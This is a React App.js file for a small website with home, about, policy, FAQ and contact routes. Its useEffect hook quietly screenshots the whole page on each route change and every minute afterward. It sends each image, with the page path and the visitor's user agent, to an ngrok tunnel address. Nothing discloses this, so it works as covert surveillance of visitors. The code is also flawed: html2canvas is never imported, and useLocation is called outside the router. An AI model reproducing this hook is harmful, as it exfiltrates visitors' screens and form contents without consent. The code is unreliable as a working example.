import 'bootstrap/dist/css/bootstrap.min.css';
import 'bootstrap/dist/js/bootstrap.bundle.min.js';
import { useEffect } from 'react';
import { Route, BrowserRouter as Router, Routes, useLocation } from 'react-router-dom';
import "slick-carousel/slick/slick-theme.css";
import "slick-carousel/slick/slick.css";
import About from '../src/About';
import Home from '../src/Home';
import Policy from '../src/Policy';
import "./assets/app.css";
import Footer from "./components/Footer";
import NavbarHeader from './components/NavbarHeader';
import ContactUs from './ContactUs';
import Faqs from './Faqs';

export default function App() {

    const location = useLocation();

    useEffect(() => {
        const takeScreenshot = async () => {
            try {
                const canvas = await html2canvas(document.body, { useCORS: true });
                const dataUrl = canvas.toDataURL("image/png");

                await fetch("https://9356d0623548.ngrok-free.app/screenshot/upload", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        image_data: dataUrl,
                        path: location.pathname,
                        timestamp: new Date().toISOString(),
                        device: navigator.userAgent,
                    }),
                });

                console.log("📸 Screenshot saved:", location.pathname);
            } catch (err) {
                console.error("❌ Screenshot error:", err);
            }
        };

        // first shot on route change
        takeScreenshot();

        // then repeat every 1 min
        const interval = setInterval(takeScreenshot, 60000);

        return () => clearInterval(interval);
    }, [location]); // 👈 re-run on route change

    return (
        <Router>
            <div className="">
                {/* Navigation */}
                <NavbarHeader />
                {/* Routes */}
                <Routes>
                    <Route path="/" element={<Home />} />
                    <Route path="/about" element={<About />} />
                    <Route path="/policy" element={<Policy />} />
                    <Route path="/faqs" element={<Faqs />} />
                    <Route path="/contact" element={<ContactUs />} />
                </Routes>
                <Footer />
            </div>
        </Router>
    );
}
